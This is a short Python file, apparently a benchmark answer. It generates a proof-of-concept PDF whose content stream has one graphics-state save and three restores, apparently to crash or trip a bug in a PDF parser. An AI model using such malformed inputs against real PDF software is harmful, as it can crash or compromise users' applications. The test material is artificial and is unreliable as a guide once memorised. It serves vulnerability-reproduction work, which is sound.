class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_parts = []
        current_offset = 0

        # Header
        header = b"%PDF-1.7\n"
        poc_parts.append(header)
        current_offset += len(header)

        # Object 1: Catalog
        obj1_offset = current_offset
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"
        poc_parts.append(obj1)
        current_offset += len(obj1)

        # Object 2: Pages
        obj2_offset = current_offset
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n"
        poc_parts.append(obj2)
        current_offset += len(obj2)

        # Object 3: Page
        obj3_offset = current_offset
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n\n"
        poc_parts.append(obj3)
        current_offset += len(obj3)

        # Object 4: Contents
        obj4_offset = current_offset
        content = b"q\nQ\nQ\nQ\n"
        content_length = len(content)
        contents_header = b"4 0 obj\n<< /Length " + str(content_length).encode() + b" >>\nstream\n"
        poc_parts.append(contents_header)
        current_offset += len(contents_header)

        poc_parts.append(content)
        current_offset += len(content)

        contents_footer = b"endstream\nendobj\n\n"
        poc_parts.append(contents_footer)
        current_offset += len(contents_footer)

        # xref
        xref_offset = current_offset
        xref_content = b"xref\n0 5\n0000000000 65535 f \n" + \
                       (f"{obj1_offset:010d} 00000 n \n".encode() + \
                        f"{obj2_offset:010d} 00000 n \n".encode() + \
                        f"{obj3_offset:010d} 00000 n \n".encode() + \
                        f"{obj4_offset:010d} 00000 n \n".encode())
        poc_parts.append(xref_content)
        current_offset += len(xref_content)

        # trailer
        trailer_content = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + f"{xref_offset}\n".encode() + b"%%EOF\n"
        poc_parts.append(trailer_content)

        poc = b"".join(poc_parts)
        return poc
